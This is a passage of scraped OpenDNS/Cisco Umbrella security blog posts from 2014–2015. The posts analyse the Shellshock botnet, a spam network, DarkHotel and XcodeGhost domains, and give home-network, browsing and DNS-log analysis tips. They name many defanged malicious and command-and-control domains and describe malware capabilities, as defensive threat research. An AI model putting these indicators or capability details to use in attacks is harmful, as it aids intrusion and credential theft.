guess could be that the surge in new probers could be a either security researchers or script kiddies. The users on the 29th who were probing, and had high malware visitation rates, were probably already compromised machines. Interestingly – only one malicious domain was found common across each of the three datasets. The advombat[.]ru domain was found once in the Stablehost dataset and three times in both the September 29th and September 30th datasets. The advombat domain is connected with ransomware downloads and, viewing a query history over the past one month, reveals that the domain receives approximately 15k queries per hour with traffic activity following a diurnal pattern. This sort of behavior supports the hypothesis that machines probing for the Shellshock vulnerability on the 29th were part of a larger compromised network. A point of further investigation would be to analyze similarities in traffic between computers that have visited advombat domain. The stablehost[.]us dataset provided us with data regarding computers that were becoming part of a larger Shellshock botnet. The most frequently found domain found across the set of 18 IPs was stabehost[.]us with 17 occurrences. The second most common was linksys[.]secureshellz[.]net. with 8 occurrences. Secureshellz has been identified by researchers such as our friends over at @MalwareMustDie as one of the C2 centers for the Shellshock botnet. It was also previously known, and blocked, for serving the Fiesta Exploit Kit at the beginning of January, 2014. In closing… So it seems that looking at the data as we’ve done thus far hasn’t really afforded us the visibility into the bot vs. human vs. infected human differentiation problem. OpenDNS Labs will continue to explore this in an upcoming blog post as we have some interesting ideas on how to attack this particular problem.", "date": "2014-10-02"},
{"website": "Cisco-Umbrella", "title": "Understanding Your Home Network and Keeping It Secure", "author": ["Dominic Bannister, Jr."], "link": "https://umbrella.cisco.com/blog/understanding-home-network-keeping-secure", "abstract": "Hi, I’m Dominic Bannister, customer support representative team lead here at OpenDNS. As you know, our service helps users connect with confidence on any device, anywhere, anytime. However, there’s more you can do to protect your home networks—for example, securing the very devices you use to connect to the Internet. Some examples of devices on your network environment include modems, routers, and computers. In this post, we’ll focus on explaining your network environment, and then provide some tips on how to secure it. Understanding Your Network Environment Let’s start by finding out more about the devices you use to connect to the Internet. Here’s a quick list of questions that should give us all the information we need: What is the make, model, and version of the modem or router provided by your Internet Service Provider (ISP)? Knowing the make, model, and version of your modem or router will not only help you understand the device’s features and limitations, but will also help you properly secure it! Check the body of the device or read the manual to find this information. What are the IP address and login credentials for your modem or router? Most modems and routers will have the default login information and IP address printed on the body. The modem or modem-router combination that your ISP provides is what we call the gateway or edge device . A gateway or edge device is networking device which handles communication from your network to the outside world. Settings on this device will dictate how the rest of your network behaves. How is your network connected to the Internet? You should map out your network environment with topology software. Just kidding! It’s not necessary for you to go that far, but a basic understanding of which devices connect to what can be very helpful. A simple map structure of your network can come in handy when locating and troubleshooting a network problem. To get you started, here’s a basic home network map: Finally, remember to note the various types of devices on your network. A modem is not exactly the same as a combination modem-router, and each will handle your network traffic in a unique way. There are many online resources that can help you understand your network devices. To get you started, here’s a video explaining the difference between a hub, a switch, and a router. Tips to Secure Your Network Environment Now that you have a better understanding of your home network, here are a few simple steps you can take to minimize unauthorized access. (Of course, by using OpenDNS, you’ve already added an extra layer of security!) Change the login credentials on your gateway device and router. As mentioned previously, most modems and routers have default login credentials that make initial configuration easy. After the initial setup, change the username (if possible) and password to prevent unauthorized access to your modem or router. There are many online resources that provide a list of default login credentials for modems and routers, which can be used to easily compromise your network. Keep your operating system and router updated. Most vulnerabilities are exploited due to outdated software and/or firmware. Running the latest operating system and router firmware helps protect your network against intrusion. Have a network use policy for your home. It is easy to overlook this point, but it is critical to have a set of protocols (pun intended) that everyone should follow. For example, one of our rules at home is “don’t click on suspicious links.” What are suspicious links? See how well you can spot a phishing site with our quiz. Create separate guest networks for visitors. Typically, if you have a Wi-Fi network and users connect to the same access point, those users are a part of and have access to your network. Isolating guest users helps prevent access to your local network resources. Many home routers have this feature, but it has to be enabled. Please consult your router’s manual on how to configure separate guest network. Disable your router’s remote login feature. Many routers allow you to remotely log in to your home machine and network, but this makes your network vulnerable to attacks. Disabling the remote login feature will prevent others who are not directly connected to your router from accessing it. Stay up-to-date on technology news about your network devices. Keeping up with the latest news about online threats that target devices on your network, sometimes region specific, can help you take necessary actions to either prevent your system from being compromised or find solutions for an already affected system. There are many websites, blogs, and forums dedicated to each of the devices you use to get online. If you prefer short updates, you can sign up for news updates or follow like-minded individuals or groups on their social media sites. Lastly, be aware of changes in your network environment. If you notice that your connection speed has slowed down significantly, or if your machine is running slower than usual, these are signs that something is amiss and needs to be checked. By no means is this a definitive guide on home networking. However, having a grasp of how your network is set up and applying basic security measures will not only help you troubleshoot your home network problems, but they will also minimize malicious users from gaining access to your network. Remember, there’s no place like 127.0.0.1 , so keep it safe! Need more help? You can always reach the OpenDNS Support Team by submitting a ticket here .", "date": "2014-10-09"},
{"website": "Cisco-Umbrella", "title": "Identifying the Behavioral Patterns of a Spam Network", "author": ["Thomas Mathew"], "link": "https://umbrella.cisco.com/blog/identifying-behavioral-patterns-spam-network", "abstract": "In 2013, email spam accounted for approximately 69% of all internet email traffic [ Kaspersky ]. Economists predict email spam costs American businesses and consumers approximately $20 billion annually, with spammers making a return of approximately $200 million per year [ Rao, Reiley ]. Rao and Reiley also note that spam provides nefarious individuals with one of the cheapest returns on investment as the production of spam is incredibly cheap. Today’s blog post investigates a spam network and identifies behavioral patterns that could be useful for further research. Spam is interesting because it can be highly networked activity that requires coordination between multiple end computers distributed throughout the globe. The Spam Run In late August, the OpenDNS Security Labs team noticed an unusual surge in DNS queries for a mail server. The figure below shows the rate of DNS queries/min over the span of 24 hours. Visual inspection indicates that a definite surge occurred towards the end of the day. The steepness in the slope for queries/min made us suspicious about the reason behind the spike. For comparison, we created a DNS query/min graph for the previous day to get an idea of more baseline query requests. The second graph shows that traffic follows an expected diurnal cycle with traffic easing off in the early morning and evening. Query spikes are a good first predicator for suspicious behavior but do not usually provide enough evidence to label behavior as malicious. Therefore, to get a better picture of the attack we captured 68 IPs that had an unusually high query rate and mapped them geographically. The image below shows their geographic distribution: The IPs had a wide geographic distribution with a small cluster in Ukraine. Furthermore, each of these IPs belonged to networks belonging to residential ISP providers. This new information validated our initial suspicions that the uptick in the queries had come from a spam run. It was now time to investigate the nature and scope of the spam run. The Network To get a better picture of the spam network, we ran a query which collected all of the DNS queries made by the 68 suspicious IPs for the current and past day. These logs were then filtered down to contain only MX records and A records for mail servers. With structured data, we needed to use a data structure which would highlight the interconnections between the different agents. Structuring the data as a bipartite graph between IPs to mail servers/domains serves as an easy way to understand the data. A bipartite graph is a graph composed of two independent sets. It allows us to easily calculate which IPs contact the same or similar mail servers. The figure below is a example of the spam network, consisting of 1000 mail servers and six suspected spam IPs. Mail servers are the blue nodes, and IPs are red nodes. Each of the IPs have a cluster of mail servers that only they contact and a few mail servers that are contacted by the whole group. The same structure exists for the larger version of the graph (68 IPs, 40k domains, and 281k edges). Analyzing the type of mail servers contacted reveals an interesting hierarchy. The most frequently contacted mail servers were servers belonging to large, well-known mail providers such as Yahoo, Google, and AOL. A second tier followed which consisted mainly of academic institutions. This was followed a mid-tier of various proxy websites. Finally, at the bottom was a set of low-profile websites. Low profile websites contacted by suspicious IPs had two features in common—they all received sporadic traffic (sub 500 queries per day) and were located in the same geographic zone as the IP sending them email. These low profile websites represent the nodes with degree one in the graph. With such geographic variance amongst the IPs, it comes as no surprise that domains residing in 19 different country TLDs received spam. The .jp TLD received the most queries with ~800k. Now that we had a better idea of how the IPs were structured in relation to the domains, we wanted to understand how they might be possibly sending mail or communicating with one another. To do this, we went back to the bipartite graph and did some edge analysis, looking for domains that lay in the ‘sweet spot’ of degree counts. We knew that nodes that were talking to a high percentage of the 68 IPs might be in some way connected to the general spam network. Results This general technique led us to identify four domains of interest. The first was the periodic request to an IP in Mexico. Some further investigation on this IP led to some interesting results: this IP served as the mail server for a set of Russian hosted domains. This itself was suspicious—a domain hosted in Russia, relying on a mail server located in Mexico. Also suspicious was the fact that this mail server was associated with a set of constantly changing domain names and IPs. In the span of one month there were a total of 3 IP changes and 10 domain name changes. Below is a graph showing the querying frequency of this domain over the course of the day: Only five of the 68 IPs did not make attempts to contact this dial-up IP during the course of the day. We suspect this IP is used as a email forwarder or open-relay for the spam campaign. From the remaining three suspicious domains, two shared similar structure with the IP in Mexico (multiple domain names associated with changing IP addresses). The last domain was a mail server misconfigured so it could serve as an open relay. Conclusion Spam is interesting because it often serves as the vector of infection for botnets or banking trojans. The majority of websites targeted by spam were small e-commerce businesses. It would not be surprising if these spam campaigns target small e-commerce websites with promises of boosting their SEO positions—e-commerce operators unknowingly click on the possibly fraudulent SEO link and become compromised. Therefore, a point of further research is to determine how many of these websites targeted by spam become either compromised websites or part of a botnet. This type of analysis can be useful in developing models that predict relationships between receiving spam and possible future infected domains or users.", "date": "2014-10-14"},
{"website": "Cisco-Umbrella", "title": "Data Mining Deep Dive into DarkHotel Domains", "author": ["Jeremiah O'Connor"], "link": "https://umbrella.cisco.com/blog/data-mining-deep-dive-darkhotel-domains", "abstract": "DarkHotel is a cyber espionage campaign targeting well-known corporate executives and political leaders in Malaysia, Japan, India, and other countries. What is fascinating about this particular syndicate is their advanced skill set, and ability to leverage high-level penetration techniques to accomplish their goal (ex. kernel mode key logger, reverse engineering certs, and 0-day exploits). In addition, after successful exfiltration of the targeted data, they are able to remove any trace of their existence from the network, making it much harder for security professionals to put the pieces of the puzzle back together. This blog is a deep dive into mining domains associated with the DarkHotel attackers, and an attempt to extract any patterns in their behavior. Some of the techniques we employed were mining WHOIS records, GeoIP data, ASN/Organization data, and performing natural language text processing on the actual DarkHotel domains themselves. DarkHotel attacks usually begin by compromising a hotel’s Wi-Fi network and targeting the victim by tricking them into downloading/installing a backdoor. For example, they may send a phishing email targeting an executive, saying their current version of Adobe Flash or anti-virus software needs to be upgraded. Thinking about this from an attacker perspective, we would need to somehow advertise the link to click on to the victim. How would we go about doing this? Well, in general, people always like to get stuff for free, so we may include the word “free” or “cheap” in the domain. Additionally, less-tech savvy business execs or politicians are not aware of these means of infection, and are more likely to click on a link saying they need to update their software, improve security, or possibly read some sort of business or news site. Let’s take a look at some examples: Typically, malicious domains fall into the pattern of using common “abuse” words, which is why we decided to use natural language text processing techniques for this experiment. One of the techniques we used to analyze these domains was to extract all the words found in the English dictionary and try to find any commonalities. We also leveraged a natural language processing technique from the Python NLTK library called stemming to help increase accuracy when extracting the most important words from a text. Stemming is a normalization technique which extracts the root of the word, and subjects it to a series of transformations such as stripping out common prefixes or suffixes. To give an example, the word “countries” would become “countri” after stemming. One of the reasons we chose stemming was to get the most accurate evaluation of a domain, and to lower the false negative rate. For example, when we compared the DarkHotel domains against domain examples found in the Mandiant APT 1 report , there were domains such as applesoftupdate[.]com and webserviceupdate[.]com. Without stemming, if we had just taken the dictionary word “update”, we would have missed domains like firefoxupdata[.]com. Here are some of the results after extracting the top dictionary words out of the DarkHotel domains list: auto: 75 occurrences updat: 32 serv: 18 free: 25 online: 6 news: 10 (Also worth mentioning: 10 occurrences of “autoupdate”) What is interesting to note is that both APT and DarkHotel domains share common “themes” and obfuscation techniques. Some of these themes can be found in the report under the category “naming themes” (p. 48). Both sets of domains seem to share common themes of containing words related to “news” and “technology”. For example, some news related domains found among DarkHotel domains are: dailynews[.]000page[.]com innewsmessenger[.]com newsagencypool[.]com Here are some of the domains associated with news found in Mandiant’s report: myyahoonews[.]com newsesport[.]com newsonet[.]net newsonlinesite[.]com This make sense, as it is more likely that business executives would be interested in clicking on news links to read while browsing online in their room. DarkHotel domains also use methods of attaching themselves to well-known technology/software related companies to make them seem more legitimate to the victim. Here are some examples found in both sets trying to attach themselves with established tech companies: DarkHotel Domains: microsoft-xpupdate[.]com. javaupdate[.]flashserv[.]net adobearm[.]com APT 1 domains: microsoft-update-info[.]com firefoxupdata[.]com gmailboxes[.]com Similarly, spoofing of security products/domains occurs in both sets: in the APT 1 report: symanteconline[.]net, mcafeepaying[.]com, and in DarkHotel domains: secureonline[.]net, checkingvirusscan[.]com.  Basically, they are targeting the victim’s lack of tech knowledge—advertising to upgrade the security of their system would obviously be a priority for a high-level executive or politician. Another feature of DarkHotel domains that we analyzed were their ASN (Autonomous System Number). We found that a lot of these domains come from obscure ASNs/registrars that were previously associated with domains exhibiting malicious behavior. Generally, malicious domains like these are associated with lesser-known ASNs/Orgs, and have very limited restrictions on abuse. Here are the top 10 ASNs the DarkHotel domains were associated with: One example of a potential abuse-detection mechanism we found when researching DarkHotel domain/ASN mappings is the domain microsoft-xupdate[.]info. If this domain really was a Microsoft update tool, wouldn’t it make sense for it to come from an ASN or Registrar associated with Microsoft, like ASN 8075, Microsoft Corporation? However, it’s associated with ASN 21740, eNom Incorporation, whose rank is 6135—which raises some suspicion. Similar logic can be applied to adobeplugs[.]net which comes from ASN 3388, LeaseWeb, or adobeupdates[.]com from ASN 53665,  Bodis. Why would it not be associated with Adobe Systems, whose ASN is 1313? These inconsistencies definitely lead to more suspicion about these domains. We also used GeoIP/MaxMind to do country code lookups on the DarkHotel domains, and here are some of our top results: United States: 113 Netherlands: 47 UK: 27 Germany: 19 Malaysia: 16 Thailand: 6 Switzerland: 6 It is interesting to see that several of them are from the US, since most of the reported attacks are from East Asia. Generally though, these country stats are pretty consistent with APT behavior, a lot of which resolve to locations in the U.S. Here is the geographic breakdown: We also mined another data set associated with these DarkHotel domains—their WHOIS records. Interestingly, we found that many of the domains have been updated very recently. A majority of the domains have been updated in the last few months, and some within the last few weeks. This is generally not the case when dealing with legitimate domains (ex. Alexa Top 1000) that very rarely update their domain registration records. This is another indicator of abuse, as attackers have to constantly evolve to stay ahead of detection mechanisms. Another curious fact: although the domains were updated recently, many of these domains were created quite some time ago. Here are some our domain results with particularly old creation dates and very recent modification dates: Domains: microchsse[.]strangled[.]net, www[.]strangled[.]net, automobiles[.]strangled[.]net Creation time: 9/24/1999 Update time: 9/9/2014 Domains: microblo5[.]mooo[.]com, microchisk[.]mooo[.]com Creation time: 3/24/2000 Update time: 3/8/2014 Domain: codec[.]servepics[.]com Creation time: 6/1/2001 Update time: 8/15/2014 Domain: www[.]universalonline[.]com Creation time: 3/12/2000 Update time: 2/11/2014 Domain: redlooksman[.]servehttp[.]com Creation time: 8/1/2000 Update time: 8/13/2014 Several of these domain creation dates span back over 10 years with some dating as far back as 1999. This suggests that the DarkHotel campaign may in fact have been going on for longer than we expected. It’s intriguing to see these old creation dates alongside the recently updated information, which implies these domains are being routinely maintained. This deserves further investigation, and could potentially be used as another detection mechanism. After analyzing these results, we have come to the conclusion that there are certain patterns in DarkHotel domain data, and that threat actors are replicating proven tactics.  The next step would be to program these findings into a feature detection algorithm and apply deeper inspection of our results. The text analysis of the domain and ASN information seemed to be the most revealing, and promising for feature detection. While the geo-diversity analysis was interesting to see, it did not reveal enough info to convert into a feature. The recently updated WHOIS records, and the fact that many of these domains have been created quite some time ago is also fascinating, but deserves deeper analysis before turning into a feature.", "date": "2014-11-19"},
{"website": "Cisco-Umbrella", "title": "3 Simple Steps towards Safer Browsing", "author": ["Kevin Bottomley"], "link": "https://umbrella.cisco.com/blog/3-simple-steps-towards-safer-browsing", "abstract": "Security in layers This blog was going to be a continuation of my last blog, “ Does Your Domain Have Bad Neighbors? “, but instead I would like to take a few minutes to cover something else that people have been asking me about recently.  Often times I get questions along the lines of ‘What are some things I can do to help protect myself even more from security threats?”. Security should be thought of in terms of layers. The more layers you add, the more you help to isolate yourself and mitigate potential attack vectors. With the recent uptick of malware using different means for delivery, including Malvertising (malicious advertising), drive-by downloads, and the use of TOR, it might be overwhelming to think of ways to protect yourself. There are a few small, simple tricks that I feel can help you focus your efforts to be most effective: Ad-Block Plus As you may have heard, the use of advertisements as a means for delivering malware has been increasing rapidly. The methods have slightly changed, however; while it is still highly recommended to avoid clicking away on random links, especially from unknown email senders, users can now be infected even without clicking recklessly. Malvertising works by running malicious code when the advertisement loads in your browser, gathering all of the information it can and sending it back to a Command and Control server, where any number of exploit kits can be used to leverage a compromise of the client machine. Ad-Block does exactly as its name implies, blocking ads that are shown to visitors of web sites. While the vast majority of ads are safe, it’s that small percentile that causes the most headaches for users and System Administrators alike. OpenDNS took the stance of removing ads from its site back in June, which you can read more about here . N0-Script Another extension I like to use is No-Script . No-Script is an extension for Firefox, but you can use JavaScript Blocker for Safari, and ScriptSafe for Chrome. All of these work in basically the same way—they only allow scripts, including JavaScript, Java, and Flash (all of which are common in leveraging compromises) to be executed with express permission from the user. How does this help? Some compromised web pages will attempt to deliver what is known as a ‘ drive-by download ‘, which will attempt to look for possible vulnerabilities in a clients machine, deliver that information back to a server, and download the exploit kit, much in the same way that Malvertising works, minus the ads. At first you might feel like your Internet experience is not the same, especially with so many sites that employ scripting to enhance user experience. No-Script offers you the option to allow sites you wholly trust to run, without having to allow the scripts every time. Globally allowing all scripts is highly discouraged. Blocking TOR TOR is used by many people all over the world to add anonymity to their web browsing. This is especially helpful in places where the Internet is heavily censored, regimes that might be monitoring dissidents trying to get the word out about repressive actions taking place, and others who just want to keep their surfing habits private. Recently, however, certain variants of malware have started using TOR as a means to call out to the Command and Control servers to download more badness (read: CryptoWall 2.0). It does not seem to be that far fetched to think that other malware families might soon follow suit. Sometimes I come across rumors that TOR (The Onion Router) cannot be blocked. To a small extent, this is true. To a larger extent, it is not. Below are two simple curl commands you can use that download the IPs used by TOR. These IPs are updated daily, so setting a cronjob to run and download the lists is pretty easy. After downloading the IPs, they are written to two CSV files, one for all the IPs and the other for the exit nodes. These lists can then be added into your firewall rules. I would like to point out that this is by no means a cure-all to blocking TOR based sites, but does reduce the means for connection by dropping the attempts from either coming into or going out of the client system. curl http://torstatus.blutmagie.de/ip_list_exit.php/Tor_ip_list_EXIT.csv > Tor_ip_list_EXIT.csv curl http://torstatus.blutmagie.de/ip_list_all.php/Tor_ip_list_ALL.csv > Tor_ip_list_ALL.csv The output will create these two files: Tor_ip_list_EXIT.csv Tor_ip_list_ALL.csv Essentially what you are doing at this point is cutting off the call-out from a machine to the first entry point in the TOR relay circuits, preventing connections to be established. I should mention that while this will block malicious connections that use the TOR network, it will also cut off any legitimate web site that might be hosted on the same IP that is not a hidden service AND will prevent you from using TOR altogether. Hopefully you find these three, yet significant, steps helpful to mitigating risk during your Internet experience.", "date": "2014-11-21"},
{"website": "Cisco-Umbrella", "title": "Releasing OpenResolve – Docker Image for Domain Information as a REST-like API", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/releasing-openresolve-docker-image-domain-information-rest-like-api", "abstract": "Today we are open-sourcing OpenResolve – a Docker image for domain information as a REST-like API. OpenResolve was built as a Master’s Project by Ryan Piaget and Kevin Funk during an internship at OpenDNS. Learn more about the project at OpenResolve.com. About the Team We are graduating Master’s Students at the University of San Francisco who’ve been interning at OpenDNS the last four months working on our Master’s Project. For our project, we designed and built a public API for retrieving domain information as a REST-like service. This guest post will share the results of our work. Motivation OpenResolve aims to address three issues in the realm of domain name lookup: DNS lookup typically requires command line tools like dig, or manual interaction with an HTML interface. Our API makes DNS resolution available as a web service for any application. DNS lookups are typically conducted over UDP, which offers no security regarding the data being transferred. Performing DNS resolution over HTTP and SSL ensures the data has not been altered. Most DNS resolution returns output in a human readable format, but isn’t easily accessible programmatically. By transferring data in a commonly consumed format, JSON, we make it convenient for even high-level applications to use the data returned from a resolver. How It Works OpenResolve is implemented as a simple python server using the Flask framework, running behind nginx. DNS lookups are performed using the dnspython library and then parsed into JSON before being returned to the client. We implement the provisional RFC draft-bortzmeyer-dns-json-00 for the return format. The server runs inside a container built from a custom Docker image and is hosted on OpenDNS infrastructure. How to Use It The API lives at api.openresolve.com and can be queried for standard lookups by making a GET request to: api.openresolve.com/<record-type>/<domain-to-lookup> The response is returned in JSON. Here’s the result of making a request for ‘A’ type records for the domain www.opendns.com : curl api.openresolve.com/a/www.opendns.com\n{\n    AA: false,\n    ReturnCode: \"NOERROR\",\n    AD: false,\n    AdditionalSection: [ ],\n    AnswerSection: [\n        {\n            Class: \"IN\",\n            Address: \"67.215.92.218\",\n            Type: \"A\",\n            Name: \"www.opendns.com.\",\n            TTL: 30\n        }\n    ],\n    ID: 45762,\n    AuthoritySection: [ ],\n    QuestionSection: {\n        Qclass: \"IN\",\n        Qtype: \"A\",\n        Qname: \"www.opendns.com.\"\n    },\n    RD: true,\n    RA: true,\n    Query: {\n        Duration: 0.003942966461181641,\n        Server: \"208.67.222.222\"\n    },\n    TC: false\n} We support lookups for these record types: A, AAAA, CNAME, LOC, MX, NAPTR, NS, PTR, SOA, TXT We also support internationalized domains via punycode conversion. So, querying: api.openresolve.com/a/ąćęłńóśźż.pl will work just fine! Additionally, OpenResolve provides support for reverse lookups: curl api.openresolve.com/reverse/67.215.92.211\n{\n    AA: false,\n    ReturnCode: \"NOERROR\",\n    AD: false,\n    AdditionalSection: [ ],\n    AnswerSection: [\n        {\n            Class: \"IN\",\n            Target: \"www.opendns.com.\",\n            Type: \"PTR\",\n            Name: \"211.92.215.67.in-addr.arpa.\",\n            TTL: 764\n        }\n    ],\n    ID: 58757,\n    AuthoritySection: [ ],\n    QuestionSection: {\n        Qclass: \"IN\",\n        Qtype: \"PTR\",\n        Qname: \"211.92.215.67.in-addr.arpa.\"\n    },\n    RD: true,\n    RA: true,\n    Query: {\n        Duration: 0.004873037338256836,\n        Server: \"208.67.222.222\"\n    },\n    TC: false\n} Next Steps In the near future we plan to add the ability to perform ANY-type queries as well as support for who-is lookups. We’ve open-sourced the project and made the source available under a BSD License. Fork it on Github , pull the docker image , or try the demo at API.OpenResolve.com . For more information check out OpenResolve.com .", "date": "2014-12-04"},
{"website": "Cisco-Umbrella", "title": "XCodeGhost 'Materializes' on App Store", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/xcodeghost-materializes", "abstract": "According to several sources , Apple’s App Store, known for being a strictly regulated closed ecosystem , has been infiltrated with malware that our friends over at Palo Alto Networks’ Unit 42 are calling XcodeGhost. Unit 42 initially discovered that the malware had infected 39 iOS apps (a number that keeps climbing and is north of 50 apps at time of publishing) potentially impacting hundreds of millions of users by embedding malicious code into specific iOS apps. Claud Xiao , author of the technical blog post, states that the XcodeGhost code embedded into infected iOS apps is capable of receiving commands from the attacker through a C2 server to prompt a fake alert dialog to phish user credentials, hijack opening specific URLs based on their scheme (which could allow for exploitation of vulnerabilities in the iOS system or other iOS apps), and read and write data in the user’s clipboard (which could be used to read the user’s password if that password is copied from a password management tool). According to a BBC News article, researchers at the e-commerce site Alibaba initially flagged the malware. It was discovered that the hackers had uploaded several altered versions of Xcode — a tool used to build iOS apps — to a Chinese cloud storage service. Then, about six months ago, the attackers posted links to the software on several forums commonly visited by Chinese developers. Let’s take a look at the C2 domains in question from the perspective of the OpenDNS Global Network Infrastructure . The first domain associated with XcodeGhost is init[.]crash-analytics[.]com . As you can see from the OpenDNS Investigate details below, we observed very few queries over the the past 30 days. The registrant for this domain utilizes a Tencent QQ, popularly known as QQ , email address. Past investigations have shown that QQ accounts (both instant messaging and email) are relatively easy to register and require very little validation of an individual’s authenticity. The IP address and name servers for this domain are on different networks that, although common, becomes an indicator to note. The second domain, init[.]icloud-diagnostics[.]com , has noticeably more traffic and a dramatic upswing in queries starting September 11. A look at the WHOIS information for this domain shows that the domain was registered by the same individual that registered init[.]crash-analytics[.]com . If we pivot on the registrant email address we can see that 18 known domains are associated with this registrant. Some interesting slightly suspiciously named domains include allsdk[.]org , ioscode[.]org , iossdk[.]org , iostool[.]com , sdkdev[.]net , and sdkdev[.]org . This domain has also recently changed from using an Amazon AWS CNAME (which will surface later in this post) to the same IP address hosting init[.]crash-analytics[.]com . As we can see, this IP address is hosting several domains owned by the registrant. Pivoting on the IP address, which is located in Singapore, we can see that it is associated with AS 63949, which is owned by hosting provider Linode . The third domain, init[.]icloud-analysis[.]com , shows the most significant spike in queries of the three. As you can see below, the query volume accelerates on September 11 and peaks over 330,000 queries. That is until the query volume normalizes on September 13 at 10:00am GMT. Unlike the other two domains the WHOIS information does not show the same registrant email address or name server information. We can note, however, that at one time all three domains had an @domainsbyproxy.com registrant email address which can be used to draw a loose association between the domains. What we do see, however, is the reappearance of the Amazon AWS CNAME that was previously associated with init[.]icloud-diagnostics[.]com , effectively associating these domains with one another. If we pivot on the CNAME associated with the domain, we see a significant spike in traffic on the day it was associated with the init[.]icloud-analytics[.]com domain. If we take a look at the co-occurrences and related domains for init[.]icloud-analysis[.]com we can see several Apple app-related names emerge, several of which are associated with apps identified as being compromised by the XcodeGhost malware. These include, NetEase, Perfect365, Qyer, and WeChat, in addition to domains associated with app publishers like TickTockApps (creator of Wallpapers10000), which also have been identified as compromised. It’s been reported that the majority of people affected were in China and our own data corroborates this claim using OpenDNS Investigates Requester Geo Distribution metric. Unsurprisingly, however, we notice substantial queries originating from the US, Australia, Canada, Brazil, India, Vietnam, Italy, and Great Britain – all of which are countries with a sizable Chinese-speaking populations. Using OpenDNS Investigate we’ve walked through an investigation, or rather corroboration of, findings from a third party. Perhaps the biggest benefit is that we didn’t have to utilize a number of disparate systems to do so. The next step in our investigation will likely be to take a look at those suspiciously named SDK domains also owned by the malicious registrant. That, of course, is another blog post entirely.", "date": "2015-09-21"},
{"website": "Cisco-Umbrella", "title": "Log Analysis with OpenDNS", "author": ["Josh Pyorre"], "link": "https://umbrella.cisco.com/blog/log-analysis-with-opendns", "abstract": "Logs…They try to tell you what’s going on in a system, but it takes a special kind of patience to read through hundreds of thousands of lines of machine generated text full of arcane errors and differing timestamps. As a security analyst, part of my job involves looking at DNS logs for potential customers and showing what they might have on their network as well as what OpenDNS would have blocked. In these reviews, we don’t have access to the systems or logs from other events to provide extra context. We typically only have information from BIND, Windows Active Directory, InfoBlox or another vendor or service. We basically perform DNS incident response using several techniques to speed up the process and help make sense of the information. Eyeballing log files line by line isn’t going to get us anything more than a headache. It’s much smarter to tackle the problem programmatically. When working with DNS logs, we tend to follow these steps. Sanitize the data Sort and unique the data Analyze the data Report When we first acquire a log file, it has its own special format. We have to convert the data to something we can work with. If we’re just trying to find the bad stuff calling out to the bad places, we don’t need much more than domain names, so we will isolate that part of the file. The most useful logs we get from a usability perspective is one in CSV format. If you’re running some version of MS Office, Excel will try to open this kind of file. However, it’s not recommended as Excel can only handle so much data before eating all the memory in a system and seizing up. We almost exclusively work in the command prompt and with Python scripts. CSV is actually text, but the values are comma separated, which means maybe just a couple fewer lines of typing. If we have a log file in CSV format, it might look like this when viewed through the terminal: (from actual logs – we changed the source IP address) To get just the domains, we can run the ‘awk’ command to print a specific column. For these lines, the domain contact is in column seven, with each column separated by commas. The command to type in this case is: cat example.txt | awk -F, '{print $7}' which prints the following: This can be sent to a file for use during the analysis portion, like so: cat example.txt | awk -F, '{print $7}' > justthedomains.txt That was an easy example. Often, the logs are much more complex. As an example, here are some of the top lines from a two gigabyte file: (source IP addresses changed) We need to get the domains out of this file too, but first we have to remove these unnecessary fields from the top using Vim: #Software: SGOS 6.5.5.1\n#Version: 1.0\n#Start-Date: 2015-09-07 09:00:00\n#Date: 2015-09-03 16:22:16\n#Fields: date time time-taken i <snip> We are now left with a large file of lines that look like this: 2015-09-07 09:00:02 169 192.168.1.223 - - - OBSERVED \"Technology/Internet\" - 200 TCP_NC_MISS POST image/jpeg http search.namequery.com 80 / - - \"Mozilla/5.0 (compatible; MSIE 8.0;)\" 10.251.106.45 239 233 - \"none\" \"none\" Continuing forward to get just those domains, columns of information for each line are separated by spaces, so we can grab the domains using ‘awk’ again. The ‘awk’ command automatically uses the space as a file delimiter, so we don’t have to specify a different delimiter like in the CSV example (we used the ‘-F,’ switch to use a comma as the delimiter in that example). That didn’t go so well. The lines are not in perfect columns. It looks like we will have to find a different way to grab those domains. The following python script achieves what we want: import re\nfrom urlparse import urlparse\nwith open('DNS_logs.log') as f:\nfor eachline in f:\nurlsearch = re.findall(r'(https?://S+)', eachline)\nurl = str(urlsearch).replace('['','').replace('']','').replace('[]','')\nurl_components = urlparse(url)\nif \"http\" in url_components:\njustthedomain =  url_components.netloc\nprint justthedomain Here are the results (of just a small part) after running the script: We’re left with a list of domains, some of which are duplicates (because they’re contacted multiple times by the client machines). To make processing faster during the analysis stage, we want to remove duplicates. Assuming we ran the python script and sent its output to a text file called domains.txt, we can then get just the unique domains: sort -u domains.txt If that list is sent to a new file called unique_domains.txt, we can then run the domains through OpenDNS Investigate using its API to get all kinds of information, including domain score (which determines if a domain is considered malicious or benign), Whois details, ASN information, related domains, and more. Using the Investigate API is straightforward and well documented . Investigate makes it possible to send a list of domains (we have sent millions at a time) using urllib2 , receive a JSON document and parse through it, writing the results to a file for quick analysis. Going over everything that’s possible with the Investigate API is beyond this post, but the following example demonstrates how to gather Whois information for a domain. We’ll be using a domain from the CSV file we first looked at: monarchestatemanagement[.]com from urllib2 import Request, urlopen import json api_key = 'Your Investigate API Key' headers = {'Authorization': 'Bearer ' + api_key} request = Request('https://investigate.api.opendns.com/whois/monarchestatemanagement.com.json', headers=headers) response_body = urlopen(request).read() values = json.loads(response_body) print values['registrarName'] + ',' + values['expires'] Running this prints the fields we requested, the registrar and the expiration date: We are able to acquire more information than just Whois on our list of domains with the Investigate API. Using the same domain as in the previous example, the original logs show allowed communication to monarchestatemanagement[.]com. However, looking at it with Investigate API, we learn that this domain would have been blocked if they were using OpenDNS (the screenshot is from the web interface for Investigate): Log analysis doesn’t have to be boring. This is really just the tip of the iceberg. We are always exploring new ideas in this area. One of the more interesting ways we look at logs is by sending them with Logstash to an ElasticSearch cluster for visual analysis with Kibana . The technologies are out there to enable you to get out of your text editor and into a better place.", "date": "2015-09-22"},
